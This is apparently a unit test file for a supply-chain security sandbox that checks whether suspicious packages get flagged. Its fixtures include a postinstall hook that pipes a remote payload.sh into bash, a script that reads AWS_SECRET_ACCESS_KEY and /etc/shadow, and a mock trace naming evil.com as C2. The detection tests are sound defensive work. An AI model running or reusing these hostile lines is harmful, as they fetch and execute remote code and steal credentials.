"""
Unit tests for TopoChain isolated behavioral sandbox subsystem.
"""

import tempfile
import json
from pathlib import Path

from topochain.core.sandbox import (
    BehavioralObservation,
    BehavioralSandboxRunner,
    SandboxConfig,
)
from topochain.core.fusion.risk_engine import RiskFusionEngine


def test_sandbox_safe_code():
    with tempfile.TemporaryDirectory() as tmpdir:
        p = Path(tmpdir)
        (p / "main.py").write_text("def hello():\n    return 'world'\n", encoding="utf-8")

        runner = BehavioralSandboxRunner(SandboxConfig(mode="emulation"))
        obs = runner.run_observation(tmpdir)

        assert obs.status == "SUCCESS"
        assert obs.risk_score == 0.0
        assert len(obs.anomalies) == 0

        sig = obs.to_channel_signal()
        assert sig.name == "runtime"
        assert sig.score == 0.0


def test_sandbox_suspicious_package_lifecycle():
    with tempfile.TemporaryDirectory() as tmpdir:
        p = Path(tmpdir)
        pkg = {
            "name": "legit-pkg",
            "scripts": {
                "postinstall": "curl -s http://192.168.1.100/payload.sh | bash"
            }
        }
        (p / "package.json").write_text(json.dumps(pkg), encoding="utf-8")

        runner = BehavioralSandboxRunner(SandboxConfig(mode="emulation"))
        obs = runner.run_observation(tmpdir)

        assert obs.status == "ANOMALY_DETECTED"
        assert obs.risk_score > 0.5
        assert any("postinstall" in a for a in obs.anomalies)

        sig = obs.to_channel_signal()
        assert sig.score > 0.5
        assert len(sig.evidence) > 0


def test_sandbox_sensitive_file_and_env():
    with tempfile.TemporaryDirectory() as tmpdir:
        p = Path(tmpdir)
        (p / "exfil.py").write_text(
            "import os\nt = os.environ.get('AWS_SECRET_ACCESS_KEY')\nopen('/etc/shadow')\n",
            encoding="utf-8"
        )

        runner = BehavioralSandboxRunner(SandboxConfig(mode="emulation"))
        obs = runner.run_observation(tmpdir)

        assert obs.status == "ANOMALY_DETECTED"
        assert obs.risk_score >= 0.5
        assert any("AWS_SECRET_ACCESS_KEY" in a for a in obs.anomalies)


def test_sandbox_mock_and_fusion():
    runner = BehavioralSandboxRunner(SandboxConfig(mode="mock"))
    mock_trace = {
        "network_attempts": [{"target": "evil.com", "port": 443}],
        "sensitive_reads": [".env"],
        "processes_spawned": ["whoami"],
        "anomalies": ["Outbound connection to unlisted C2"]
    }
    obs = runner.run_observation(repo_dir=".", mock_events=mock_trace)
    assert obs.status == "ANOMALY_DETECTED"
    assert obs.risk_score > 0.7

    sig = obs.to_channel_signal()
    fusion = RiskFusionEngine(custom_weights={"runtime": 0.40, "dependency": 0.30, "semantic": 0.30})
    result = fusion.fuse_signals({"runtime": sig})
    assert result.composite_risk > 0.6
